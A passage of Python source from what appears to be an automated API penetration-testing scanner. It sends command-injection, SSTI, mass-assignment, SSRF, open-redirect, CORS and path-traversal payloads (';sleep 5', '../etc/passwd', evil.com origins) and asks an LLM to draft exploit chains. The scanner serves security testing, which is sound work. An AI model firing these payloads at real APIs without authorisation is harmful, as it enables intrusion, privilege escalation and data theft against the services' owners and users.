                                        f"on param '{param}' — benign baseline did not contain this value"
                                    ),
                                    "poc_body": {**ex_body, param: ssti_payload},
                                }, client.headers)
                                if f:
                                    inj_findings.append(f)
                                    afile(D.ssti / "ssti_findings.txt",
                                          f"[CRITICAL] {ep_method} {url} param={param} payload={ssti_payload}")
                                    crit(f"SSTI confirmed: {url} param={param} evaluated {ssti_payload}={expected_result}")
                                    tg.queue_finding("CRITICAL","SSTI",
                                        f"Template evaluated at {url} param={param}")
                    except: pass

    # Command injection
    inf("Testing command injection (time-based)...")
    CMDI_TIME_PAYLOADS = [";sleep 5", "|sleep 5", "&&sleep 5", "$(sleep 5)", "`sleep 5`"]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for url, pinfo in list(all_params.items())[:5]:
            fields  = pinfo.get("fields", [])
            ex_body = pinfo.get("example_body", {})
            for param in fields[:3]:
                for payload in CMDI_TIME_PAYLOADS[:2]:
                    try:
                        start = time.time()
                        async with s.post(url,
                                           json={**ex_body, param: f"test{payload}"},
                                           headers=client.headers) as r:
                            elapsed = time.time() - start
                            if elapsed >= 4.5:
                                f = safe_finding({
                                    "type":       "Command Injection (Time-based)",
                                    "sev":        "CRITICAL",
                                    "url":        url,
                                    "method":     "POST",
                                    "param":      param,
                                    "payload":    payload,
                                    "time_delay": round(elapsed, 2),
                                    "detail":     f"Payload {payload!r} caused {elapsed:.1f}s delay on param '{param}'",
                                    "poc_body":   {**ex_body, param: f"test{payload}"},
                                }, client.headers)
                                if f:
                                    inj_findings.append(f)
                                    afile(D.cmdi / "cmdi_findings.txt",
                                          f"[CRITICAL] {url} param={param} delay={elapsed:.1f}s")
                                    crit(f"CMDi time-based confirmed: {url} param={param} delay={elapsed:.1f}s")
                                    tg.queue_finding("CRITICAL","Command Injection",
                                        f"Time-based {elapsed:.1f}s delay on param '{param}' at {url}")
                    except: pass

    sjson(D.injection / "injection_findings.json", inj_findings)
    stats["injection_findings"] = len(inj_findings)
    ok(f"Injection testing: {len(inj_findings)} findings")
    return inj_findings

# PHASE 6 — MASS ASSIGNMENT
async def phase_mass_assignment(base_url: str, D: OutputDirs, client: APIClient,
                                  live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(6, "MASS ASSIGNMENT TESTING")
    ma_findings: List[Dict] = []

    # Extended privilege field list — covers REST, GraphQL, internal field names
    PRIV_FIELDS = [
        # Boolean privilege flags
        "admin","is_admin","isAdmin","is_superuser","isSuperuser","superuser",
        "staff","is_staff","isStaff","verified","is_verified","isVerified",
        "active","is_active","isActive","enabled","premium","is_premium","isPremium",
        "approved","is_approved","internal","is_internal",
        # Role fields
        "role","roles","user_role","userRole","account_type","accountType",
        "user_type","userType","membership","tier","plan","level","rank",
        # Permission fields
        "permissions","scopes","access_level","accessLevel","privilege",
        "capabilities","grants","allowed_actions","allowedActions",
        # Sensitive data fields
        "balance","credit","credits","tokens","quota","limit","rate_limit",
        "price","discount","fee","tax_exempt","taxExempt",
        # Email/identity
        "email_verified","emailVerified","phone_verified","phoneVerified",
        "two_factor_enabled","twoFactorEnabled","mfa_enabled",
    ]

    evidence_dir = D.mass_assign / "evidence"
    evidence_dir.mkdir(exist_ok=True)

    def _field_in_response(field: str, body: str) -> Any:
        """Check if a field and its value appear in a JSON response."""
        try:
            data = json.loads(body)
            def _search(d):
                if isinstance(d, dict):
                    if field in d:
                        return d[field]
                    for v in d.values():
                        r = _search(v)
                        if r is not None: return r
                elif isinstance(d, list):
                    for item in d:
                        r = _search(item)
                        if r is not None: return r
            return _search(data)
        except: return None

    def _truthy(val) -> bool:
        return val in [True, 1, "true", "True", "1", "yes", "admin", "superuser"]

    # Strategy 1: Registration endpoint mass assignment
    inf("Phase 6a: Registration endpoint mass assignment...")
    register_eps = [e for e in live_paths
                    if any(kw in e.get("path","").lower()
                           for kw in ["register","signup","sign-up","create","enroll"])]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in register_eps[:3]:
            ts         = int(time.time())
            test_user  = f"recon{ts}"
            test_pass  = "Test@1234!"
            test_email = f"recon{ts}@pentest.local"

            spec_body = ep.get("example_body", {})
            base_payload: Dict = {}
            for fn in ep.get("body_fields", []):
                fl = fn.lower()
                if "user" in fl:    base_payload[fn] = test_user
                elif "pass" in fl:  base_payload[fn] = test_pass
                elif "email" in fl: base_payload[fn] = test_email
                else:               base_payload[fn] = spec_body.get(fn, "test")
            if not base_payload:
                base_payload = {"username": test_user, "password": test_pass, "email": test_email}

            for priv_field in PRIV_FIELDS[:15]:
                # Skip if field is already in spec (it's documented, not mass assignment)
                if priv_field in ep.get("body_fields", []): continue

                payload = {**base_payload, priv_field: True}
                try:
                    async with s.post(ep["url"], json=payload,
                                       headers=client.headers) as r:
                        if r.status not in [200, 201]: continue
                        reg_body = await r.text()

                        # Check if field reflected in registration response
                        reflected_val = _field_in_response(priv_field, reg_body)
                        if _truthy(reflected_val):
                            ev = evidence_dir / f"MA_register_{priv_field}.txt"
                            ev.write_text(
                                f"=== MASS ASSIGNMENT EVIDENCE ===\n"
                                f"Endpoint : {ep['url']}\n"
                                f"Method   : POST\n"
                                f"Field    : {priv_field}\n\n"
                                f"=== REQUEST BODY ===\n{json.dumps(payload, indent=2)}\n\n"
                                f"=== RESPONSE ({r.status}) ===\n{reg_body[:3000]}\n"
                            )
                            finding = enrich_finding({
                                "type":     "Mass Assignment — Registration Privilege Escalation",
                                "sev":      "CRITICAL",
                                "url":      ep["url"],
                                "method":   "POST",
                                "field":    priv_field,
                                "detail":   f"POST {ep['path']} accepted undocumented field '{priv_field}'=true → reflected as {reflected_val} in response",
                                "evidence_file": str(ev),
                                "poc_body": payload,
                            }, client.headers)
                            ma_findings.append(finding)
                            crit(f"[MASS ASSIGN CRITICAL] {ep['path']} — {priv_field}=true accepted and reflected!")
                            console.print(f"  [bold red]PoC curl:[/bold red]\n  {finding['poc_curl']}")
                            tg.queue_finding("CRITICAL", "Mass Assignment",
                                f"POST {ep['path']} — field '{priv_field}' accepted and reflected as {reflected_val}")
                except: pass

    # Strategy 2: Update/PATCH endpoint field injection
    inf("Phase 6b: PUT/PATCH endpoint mass assignment...")
    update_eps = [e for e in live_paths
                  if e.get("method") in ["PUT","PATCH"] or
                  any(kw in e.get("path","").lower()
                      for kw in ["update","edit","profile","account","settings","me"])]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in update_eps[:10]:
            example_body = ep.get("example_body") or {}
            method = ep.get("method","PUT") if ep.get("method") in ["PUT","PATCH"] else "PUT"

            # First, get baseline response without injected fields
            try:
                async with s.request(method, ep["url"], json=example_body,
                                      headers=client.headers) as base_r:
                    base_body   = await base_r.text()
                    base_status = base_r.status
            except: continue

            for priv_field in PRIV_FIELDS[:20]:
                if priv_field in ep.get("body_fields",[]): continue
                test_payload = {**example_body, priv_field: True}
                try:
                    async with s.request(method, ep["url"], json=test_payload,
                                          headers=client.headers) as r:
                        body = await r.text()
                        if r.status not in [200, 201, 204]: continue

                        reflected_val = _field_in_response(priv_field, body)
                        if _truthy(reflected_val):
                            ev = evidence_dir / f"MA_update_{priv_field}_{ep['path'].replace('/','_')[:40]}.txt"
                            ev.write_text(
                                f"=== MASS ASSIGNMENT EVIDENCE ===\n"
                                f"Endpoint : {ep['url']}\n"
                                f"Method   : {method}\n"
                                f"Field    : {priv_field}\n\n"
                                f"=== BASELINE REQUEST ===\n{json.dumps(example_body,indent=2)}\n"
                                f"=== BASELINE RESPONSE ({base_status}) ===\n{base_body[:1500]}\n\n"
                                f"=== INJECTED REQUEST ===\n{json.dumps(test_payload,indent=2)}\n"
                                f"=== INJECTED RESPONSE ({r.status}) ===\n{body[:1500]}\n"
                            )
                            finding = enrich_finding({
                                "type":     "Mass Assignment — Update Endpoint",
                                "sev":      "HIGH",
                                "url":      ep["url"],
                                "method":   method,
                                "field":    priv_field,
                                "detail":   f"{method} {ep['path']} accepted undocumented field '{priv_field}'=true → reflected as {reflected_val}",
                                "evidence_file": str(ev),
                                "poc_body": test_payload,
                            }, client.headers)
                            ma_findings.append(finding)
                            warn(f"[MASS ASSIGN HIGH] {method} {ep['path']} — '{priv_field}' accepted")
                            console.print(f"  [bold yellow]PoC curl:[/bold yellow]\n  {finding['poc_curl'][:120]}...")
                            tg.queue_finding("HIGH","Mass Assignment",finding["detail"])
                except: pass

    # ── Strategy 3: GET endpoints — check for over-exposure of sensitive fields
    inf("Phase 6c: Response field over-exposure check...")
    SENSITIVE_RESPONSE_FIELDS = [
        "password","passwd","secret","private_key","privateKey","api_key","apiKey",
        "token","access_token","refresh_token","credit_card","ssn","dob",
        "internal","admin","role","is_admin","permissions","balance","salary",
        "hash","salt","encryption_key","mfa_secret","backup_codes",
    ]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in [e for e in live_paths if e.get("status") == 200][:20]:
            try:
                async with s.get(ep["url"], headers=client.headers) as r:
                    if r.status != 200: continue
                    body = await r.text()
                    for sens_field in SENSITIVE_RESPONSE_FIELDS:
                        val = _field_in_response(sens_field, body)
                        if val is not None and str(val).strip() not in ["","null","None","false","0"]:
                            finding = enrich_finding({
                                "type":   f"Sensitive Field Exposed — {sens_field}",
                                "sev":    "HIGH" if sens_field in ["password","secret","private_key","api_key","token"] else "MEDIUM",
                                "url":    ep["url"],
                                "method": "GET",
                                "field":  sens_field,
                                "detail": f"GET {ep.get('path','')} response contains field '{sens_field}' with non-empty value",
                                "poc_body": None,
                            }, client.headers)
                            ma_findings.append(finding)
                            warn(f"[OVER-EXPOSURE] {ep['path']} exposes '{sens_field}'")
                            break  # one finding per endpoint
            except: pass

    sjson(D.mass_assign / "mass_assignment_findings.json", ma_findings)
    stats["mass_assignment_findings"] = len(ma_findings)
    ok(f"Mass assignment: {len(ma_findings)} findings | evidence → {evidence_dir}")
    return ma_findings

# PHASE 7 — SSRF TESTING
async def phase_ssrf(base_url: str, D: OutputDirs, client: APIClient,
                      live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(7, "SSRF TESTING")

    ssrf_findings: List[Dict] = []

    # Common SSRF parameter names
    SSRF_PARAMS = [
        "url", "uri", "path", "dest", "destination", "redirect",
        "redirectUrl", "redirect_url", "next", "return", "returnUrl",
        "return_url", "callback", "callbackUrl", "callback_url",
        "link", "href", "src", "source", "target", "host", "hostname",
        "domain", "endpoint", "api", "feed", "to", "from", "image",
        "imageUrl", "image_url", "file", "filename", "document",
        "webhook", "webhookUrl", "webhook_url", "proxy", "proxyUrl",
        "proxy_url", "service", "serviceUrl", "remote",
    ]

    inf(f"Testing SSRF on {len(SSRF_PARAMS)} parameter names × {len(SSRF_PAYLOADS)} payloads...")

    # Collect all params from discovered endpoints
    all_endpoint_params: Dict[str, Set[str]] = {}
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in [e for e in live_paths if e["status"] == 200][:10]:
            try:
                async with s.get(ep["url"], headers=client.headers) as r:
                    body = await r.text()
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict):
                            all_endpoint_params[ep["url"]] = set(data.keys()) & set(SSRF_PARAMS)
                    except: pass
            except: pass

    # SSRF via known params
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for url, params in all_endpoint_params.items():
            for param in params:
                for ssrf_url in SSRF_PAYLOADS[:6]:
                    for method, kwargs in [
                        ("GET",  {"params": {param: ssrf_url}}),
                        ("POST", {"json": {param: ssrf_url}}),
                    ]:
                        try:
                            async with s.request(method, url,
                                                  headers=client.headers, **kwargs) as r:
                                body = await r.text()
                                # Check for metadata responses
                                ssrf_indicators = [
                                    "ami-id", "instance-id", "meta-data",
                                    "computeMetadata", "identityCredentials",
                                    "root:x:0:", "bin/bash", "Connection refused",
                                    "redis_version", "mongod", "elasticse",
                                ]
                                for indicator in ssrf_indicators:
                                    if indicator.lower() in body.lower():
                                        ssrf_findings.append({
                                            "type": "SSRF",
                                            "sev": "CRITICAL",
                                            "url": url, "param": param,
                                            "payload": ssrf_url,
                                            "method": method,
                                            "indicator": indicator,
                                        })
                                        afile(D.ssrf / "ssrf_findings.txt",
                                              f"[CRITICAL] {method} {url} param={param} payload={ssrf_url}")
                                        crit(f"SSRF: {url} param={param}")
                                        tg.queue_finding(
                                            "CRITICAL", "SSRF Detected",
                                            f"Param: {param} | Payload: {ssrf_url} | Indicator: {indicator}")
                                        break
                        except: pass

    # SSRF via URL path
    for ep in live_paths[:5]:
        path_parts = ep["path"].split("/")
        for i, part in enumerate(path_parts):
            if "http" in part.lower() or part.startswith("www"):
                for ssrf_url in SSRF_PAYLOADS[:3]:
                    new_parts = path_parts.copy()
                    new_parts[i] = urllib.parse.quote(ssrf_url, safe="")
                    test_path = "/".join(new_parts)
                    ssrf_findings.append({
                        "type": "SSRF via Path",
                        "sev": "MEDIUM",
                        "url": f"{base_url}{test_path}",
                        "detail": f"URL-like value in path segment: {part}",
                    })
                break

    # Open redirect + SSRF chain
    inf("Checking for open redirects (SSRF chain)...")
    redirect_params = ["redirect", "next", "return", "to", "url", "redirectUrl"]
    for ep in live_paths[:10]:
        for param in redirect_params:
            for ssrf_url in ["http://evil.com", "https://attacker.com", "//evil.com"]:
                test_url = f"{base_url}{ep['path']}?{param}={urllib.parse.quote(ssrf_url)}"
                async with aiohttp.ClientSession(
                        timeout=aiohttp.ClientTimeout(total=8),
                        connector=aiohttp.TCPConnector(ssl=False)) as s:
                    try:
                        async with s.get(test_url, headers=client.headers,
                                         allow_redirects=False) as r:
                            if r.status in [301, 302, 307, 308]:
                                location = r.headers.get("Location", "")
                                if "evil.com" in location or "attacker.com" in location:
                                    ssrf_findings.append({
                                        "type": "Open Redirect",
                                        "sev": "MEDIUM",
                                        "url": test_url,
                                        "redirects_to": location,
                                    })
                                    warn(f"Open redirect: {test_url} → {location}")
                    except: pass
                break

    sjson(D.ssrf / "ssrf_findings.json", ssrf_findings)
    stats["ssrf_findings"] = len(ssrf_findings)
    ok(f"SSRF testing: {len(ssrf_findings)} findings")
    return ssrf_findings

# PHASE 8 — SECURITY HEADERS & CORS
async def phase_headers(base_url: str, D: OutputDirs, client: APIClient,
                         live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(8, "SECURITY HEADERS · CORS · TLS")

    hdr_findings: List[Dict] = []

    # Security headers check
    inf("Analyzing security headers...")
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        try:
            async with s.get(base_url, headers=client.headers) as r:
                resp_hdrs = {k.lower(): v for k, v in r.headers.items()}
                missing_hdrs = []
                exposed_hdrs = []

                for hdr, info in SECURITY_HEADERS.items():
                    hdr_lower = hdr.lower()
                    if hdr_lower not in resp_hdrs:
                        if info["sev"] in ["HIGH", "CRITICAL", "MEDIUM"]:
                            missing_hdrs.append(f"[{info['sev']}] {hdr}: {info['desc']}")
                            hdr_findings.append({
                                "type": f"Missing Header: {hdr}",
                                "sev": info["sev"],
                                "detail": info["desc"],
                            })
                    else:
                        val = resp_hdrs[hdr_lower]
                        # Check for dangerous values
                        if hdr == "Access-Control-Allow-Origin" and val == "*":
                            hdr_findings.append({
                                "type": "CORS Wildcard",
                                "sev": "HIGH",
                                "detail": "Access-Control-Allow-Origin: * allows any origin",
                                "value": val,
                            })
                            warn("CORS wildcard (*) detected!")
                        if hdr in ["X-Powered-By", "Server"]:
                            exposed_hdrs.append(f"{hdr}: {val}")
                            hdr_findings.append({
                                "type": f"Tech Stack Exposed: {hdr}",
                                "sev": "INFO",
                                "detail": f"{hdr}: {val}",
                            })

                if missing_hdrs:
                    (D.headers / "missing_headers.txt").write_text("\n".join(missing_hdrs))
                    warn(f"Missing security headers: {len(missing_hdrs)}")
                if exposed_hdrs:
                    (D.headers / "exposed_tech.txt").write_text("\n".join(exposed_hdrs))

                # Save full headers
                (D.headers / "response_headers.json").write_text(
                    json.dumps(dict(r.headers), indent=2))
        except Exception as ex:
            warn(f"Header check error: {ex}")

    # CORS testing
    inf("CORS misconfiguration testing...")
    cors_findings = []
    test_origins = [
        "https://evil.com",
        f"https://attacker.{base_url.split('://')[-1].split('/')[0]}",
        "null",
        "https://evil.com.target.com",
        f"https://target{base_url.split('://')[-1]}",
        "http://localhost",
        "https://evil%60.com",
        "https://evilcom",
    ]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in [e for e in live_paths if e["status"] == 200][:10]:
            for origin in test_origins:
                try:
                    async with s.get(ep["url"],
                                      headers={**client.headers, "Origin": origin}) as r:
                        acao = r.headers.get("Access-Control-Allow-Origin", "")
                        acac = r.headers.get("Access-Control-Allow-Credentials", "")
                        acam = r.headers.get("Access-Control-Allow-Methods", "")

                        if acao == origin:
                            sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
                            detail = (f"Origin '{origin}' reflected | "
                                      f"Allow-Credentials: {acac} | "
                                      f"Methods: {acam}")
                            cors_findings.append({
                                "url": ep["url"], "sev": sev,
                                "origin": origin, "detail": detail
                            })
                            hdr_findings.append({
                                "type": "CORS Misconfiguration",
                                "sev": sev, "url": ep["url"], "detail": detail
                            })
                            c = crit if sev == "CRITICAL" else warn
                            c(f"CORS: {ep['url']} reflects {origin} | Creds: {acac}")
                            if sev == "CRITICAL":
                                tg.queue_finding(
                                    "CRITICAL", "CORS Misconfiguration",
                                    f"Origin reflected with credentials=true\n{ep['url']}\nOrigin: {origin}")
                        elif acao == "*":
                            cors_findings.append({
                                "url": ep["url"], "sev": "MEDIUM",
                                "detail": "Wildcard ACAO"
                            })
                except: pass

    if cors_findings:
        sjson(D.headers / "cors_findings.json", cors_findings)
        ok(f"CORS issues: {len(cors_findings)}")

    # TLS/SSL check
    inf("TLS/SSL configuration check...")
    if base_url.startswith("https"):
        rc, out, _ = await run(
            f"curl -sv --max-time 10 {base_url} 2>&1 | grep -E '(SSL|TLS|cipher|protocol|certificate)' | head -20",
            15)
        if out:
            (D.transport / "tls_info.txt").write_text(out)
        # Check for HTTP redirect
        http_url = base_url.replace("https://", "http://")
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                          connector=aiohttp.TCPConnector(ssl=False)) as s:
            try:
                async with s.get(http_url, allow_redirects=False) as r:
                    if r.status not in [301, 302, 307, 308]:
                        hdr_findings.append({
                            "type": "HTTP Not Redirected to HTTPS",
                            "sev": "HIGH",
                            "detail": f"HTTP {r.status} — no forced HTTPS redirect"
                        })
                        warn("HTTP not auto-redirected to HTTPS!")
                    else:
                        ok("HTTP → HTTPS redirect works")
            except: pass

    sjson(D.headers / "header_findings.json", hdr_findings)
    stats["header_findings"] = len(hdr_findings)
    ok(f"Headers/CORS/TLS: {len(hdr_findings)} findings")
    return hdr_findings

# PHASE 9 — INFORMATION LEAKAGE
async def phase_info_leak_fixed(base_url: str, D: OutputDirs, client: APIClient,
                                  live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(9, "INFORMATION LEAKAGE DETECTION")

    leak_findings: List[Dict] = []
    inf(f"Scanning responses for {len(INFO_LEAK_PATTERNS)} leak patterns...")

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=connector) as s:
        for ep in live_paths[:30]:
            try:
                async with s.get(ep["url"], headers=client.headers) as r:
                    body = await r.text()
                    for pattern_name, pattern in INFO_LEAK_PATTERNS.items():
                        matches = re.findall(pattern, body, re.IGNORECASE)
                        if matches:
                            sev = "CRITICAL" if any(kw in pattern_name.lower()
                                                    for kw in ["aws", "private key", "password", "sql error"]) \
                                  else "HIGH" if any(kw in pattern_name.lower()
                                                     for kw in ["jwt", "stack trace", "nosql"]) \
                                  else "MEDIUM"
                            leak_findings.append({
                                "type": f"Info Leak: {pattern_name}",
                                "sev": sev,
                                "url": ep["url"],
                                "matches": [str(m)[:100] for m in matches[:3]],
                            })
                            if sev in ["CRITICAL", "HIGH"]:
                                warn(f"{pattern_name}: {ep['url']}")
                                tg.queue_finding(
                                    sev, f"Info Leak: {pattern_name}",
                                    f"URL: {ep['url']}\nMatch: {str(matches[0])[:200]}")
            except: pass

        # Trigger errors
        for ep in live_paths[:5]:
            try:
                async with s.post(ep["url"],
                                   data="<xml>test</xml>",
                                   headers={**client.headers, "Content-Type": "text/xml"}) as r:
                    body = await r.text()
                    if r.status == 500:
                        for pattern_name, pattern in list(INFO_LEAK_PATTERNS.items())[:10]:
                            if re.search(pattern, body, re.IGNORECASE):
                                leak_findings.append({
                                    "type": f"500 Error Info Leak: {pattern_name}",
                                    "sev": "HIGH", "url": ep["url"],
                                })
            except: pass

    sjson(D.info_leak / "info_leak_findings.json", leak_findings)
    stats["info_leak_findings"] = len(leak_findings)
    ok(f"Info leak detection: {len(leak_findings)} findings")
    return leak_findings

# PHASE 10 — BUSINESS LOGIC & MISC
async def phase_business_logic(base_url: str, D: OutputDirs, client: APIClient,
                                live_paths: List[Dict], tg: TelegramNotifier, stats: dict):
    pb(10, "BUSINESS LOGIC & MISC CHECKS")

    bl_findings: List[Dict] = []

    # HTTP method override
    inf("Testing HTTP method override...")
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method",
        "_method", "X-HTTP-Method",
    ]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in live_paths[:10]:
            for override_hdr in OVERRIDE_HEADERS:
                for method in ["DELETE", "PUT", "PATCH"]:
                    try:
                        hdrs = {**client.headers, override_hdr: method}
                        async with s.post(ep["url"], headers=hdrs) as r:
                            if r.status not in [404, 405, 400]:
                                bl_findings.append({
                                    "type": "HTTP Method Override",
                                    "sev": "MEDIUM",
                                    "url": ep["url"],
                                    "header": f"{override_hdr}: {method}",
                                    "status": r.status,
                                })
                                warn(f"Method override {method} via {override_hdr}: {ep['path']}")
                    except: pass

    # Path traversal
    inf("Testing path traversal...")
    TRAVERSAL = ["../", "../../", "../../../", "..%2f", "%2e%2e%2f",
                 "..%252f", "%252e%252e%252f", "....//", "..\\/"]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in live_paths[:10]:
            for traversal in TRAVERSAL[:4]:
                test_url = f"{base_url}{ep['path']}/{traversal}etc/passwd"
                try:
                    async with s.get(test_url, headers=client.headers) as r:
                        body = await r.text()
                        if "root:x:0" in body or "/bin/bash" in body:
                            bl_findings.append({
                                "type": "Path Traversal",
                                "sev": "CRITICAL",
                                "url": test_url,
                                "evidence": "passwd file content",
                            })
                            crit(f"PATH TRAVERSAL: {test_url}")
                            tg.queue_finding("CRITICAL", "Path Traversal",
                                                   f"Accessed /etc/passwd via {test_url}")
                except: pass

    # Negative price / integer overflow
    inf("Testing numeric edge cases (negative values, overflow)...")
    payment_endpoints = [e for e in live_paths
                         if any(kw in e["path"].lower()
                                for kw in ["order", "payment", "price", "cart", "checkout",
                                           "purchase", "buy", "amount", "quantity"])]
    EDGE_VALUES = [-1, -999, 0, 0.001, 99999999999, -99999999999,
                   "null", "undefined", "NaN", "Infinity", "-Infinity"]

    for ep in payment_endpoints[:5]:
        for param in ["price", "amount", "quantity", "count", "total"]:
            for val in EDGE_VALUES[:4]:
                async with aiohttp.ClientSession(
                        timeout=aiohttp.ClientTimeout(total=8),
                        connector=aiohttp.TCPConnector(ssl=False)) as s:
                    try:
                        async with s.post(ep["url"],
                                           json={param: val},
                                           headers=client.headers) as r:
                            body = await r.text()
                            if r.status in [200, 201] and str(val) in body:
                                bl_findings.append({
                                    "type": "Business Logic — Edge Value Accepted",
                                    "sev": "HIGH",
                                    "url": ep["url"],
                                    "param": param, "value": val,
                                })
                                warn(f"Edge value {val} accepted: {ep['path']} param={param}")
                    except: pass

    # Test pagination / offset manipulation
    inf("Testing pagination manipulation...")
    paginated = [e for e in live_paths
                 if e["status"] == 200 and any(kw in e["path"].lower()
                                               for kw in ["list", "search", "users", "orders"])]
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in paginated[:5]:
            # Test massive page size
            for param, val in [("limit", 99999), ("per_page", 99999),
                                ("page_size", 99999), ("size", 99999)]:
                try:
                    async with s.get(ep["url"],
                                      params={param: val},
                                      headers=client.headers) as r:
                        body = await r.text()
                        try:
                            data = json.loads(body)
                            if isinstance(data, list) and len(data) > 100:
                                bl_findings.append({
                                    "type": "Mass Data Exposure",
                                    "sev": "MEDIUM",
                                    "url": ep["url"],
                                    "detail": f"?{param}={val} returned {len(data)} records",
                                })
                                warn(f"Mass data: ?{param}={val} → {len(data)} records")
                        except: pass
                except: pass

    sjson(D.business / "business_logic_findings.json", bl_findings)
    stats["business_logic_findings"] = len(bl_findings)
    ok(f"Business logic: {len(bl_findings)} findings")
    return bl_findings

# AI ANALYSIS
# AI Provider Implementations
async def _call_anthropic(session, key: str, model: str, prompt: str) -> str:
    model = model or "claude-haiku-4-5-20251001"
    async with session.post(
        "https://api.anthropic.com/v1/messages",
        headers={"Content-Type":"application/json","x-api-key":key,
                 "anthropic-version":"2023-06-01"},
        json={"model":model,"max_tokens":3000,
              "messages":[{"role":"user","content":prompt}]}
    ) as r:
        if r.status == 200:
            d = await r.json()
            return d["content"][0]["text"]
        body = await r.text()
        raise RuntimeError(f"Anthropic {r.status}: {body[:200]}")

async def _call_openai(session, key: str, model: str, prompt: str) -> str:
    model = model or "gpt-4o-mini"
    async with session.post(
        "https://api.openai.com/v1/chat/completions",
        headers={"Content-Type":"application/json","Authorization":f"Bearer {key}"},
        json={"model":model,"max_tokens":3000,
              "messages":[{"role":"user","content":prompt}]}
    ) as r:
        if r.status == 200:
            d = await r.json()
            return d["choices"][0]["message"]["content"]
        body = await r.text()
        raise RuntimeError(f"OpenAI {r.status}: {body[:200]}")

async def _call_gemini(session, key: str, model: str, prompt: str) -> str:
    model = model or "gemini-1.5-flash"
    url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key}"
    async with session.post(
        url,
        headers={"Content-Type":"application/json"},
        json={"contents":[{"parts":[{"text":prompt}]}]}
    ) as r:
        if r.status == 200:
            d = await r.json()
            return d["candidates"][0]["content"]["parts"][0]["text"]
        body = await r.text()
        raise RuntimeError(f"Gemini {r.status}: {body[:200]}")

async def _call_ai(key: str, provider: str, model: str, prompt: str) -> str:
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=120)) as s:
        if provider == "openai":
            return await _call_openai(s, key, model, prompt)
        elif provider == "gemini":
            return await _call_gemini(s, key, model, prompt)
        else:  # default: anthropic
            return await _call_anthropic(s, key, model, prompt)

async def phase_ai(base_url: str, D: OutputDirs, all_findings: List[Dict],
                    stats: dict, ai_key: str, tg: TelegramNotifier,
                    ai_provider: str = "anthropic", ai_model: str = ""):
    pb(11, "AI ANALYSIS & TRIAGE")

    if not ai_key:
        inf("No AI key — saving manual analysis prompts to AI_PROMPTS.txt")
        crit_findings = [f for f in all_findings if f.get("sev") in ["CRITICAL", "HIGH"]]
        (D.report / "AI_PROMPTS.txt").write_text(
            f"# 0xGRVapi AI Analysis Prompts\n# Target: {base_url}\n# {datetime.now().isoformat()}\n\n"
            f"## Triage\nAnalyze these findings and re-score severity with CVSS:\n"
            f"{json.dumps(crit_findings[:20], indent=2)}"
        )
        ok("Prompts saved — run with --ai-key to auto-analyze")
        return

    inf(f"AI provider: {ai_provider} / model: {ai_model or 'default'}")

    # Build a deduplicated, clean finding list for AI
    all_clean = []
    seen = set()
    for f in all_findings:
        key_str = f"{f.get('type','')}|{f.get('url','')}"
        if key_str not in seen:
            seen.add(key_str)
            all_clean.append({
                "type": f.get("type",""),
                "sev":  f.get("sev",""),
                "url":  f.get("url","") or f.get("detail",""),
                "detail": f.get("detail","")[:200],
            })

    # Separate spec endpoints for risk analysis
    spec_eps = stats.get("spec_endpoint_list", [])

    prompt = f"""You are a senior API penetration tester and bug bounty hunter.
Target: {base_url}
Scan date: {datetime.now().strftime('%Y-%m-%d')}

== RAW FINDINGS ({len(all_clean)} total, deduplicated) ==
{json.dumps(all_clean, indent=2)[:6000]}

== SCAN STATS ==
{json.dumps({k:v for k,v in stats.items() if isinstance(v,(int,str,bool))}, indent=2)}

== SPEC ENDPOINTS ==
{json.dumps(spec_eps[:30], indent=2) if spec_eps else "Not available"}

Your job (be technical, specific, no padding):

## 1. RE-SCORED FINDINGS
For each unique finding type, assign:
- Corrected severity: CRITICAL / HIGH / MEDIUM / LOW / INFO
- CVSS v3 base score (e.g. 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- One-line reasoning

Format: | FINDING | SEVERITY | CVSS | REASONING |

## 2. REAL RISKS (top 5, skip noise)
List only findings with actual exploitability. Skip missing headers unless chained.
For each: what it enables, who is affected, how to confirm manually.

## 3. EXPLOIT CHAINS
2-3 multi-step attack paths combining findings from this scan.
Format: Step 1 → Step 2 → Step 3 → Impact

## 4. HIGH-RISK ENDPOINTS (from spec)
Which endpoints are most likely to have critical bugs and why.
Focus on: auth patterns, ID parameters, write operations, admin paths.

## 5. ADDITIONAL TEST CASES
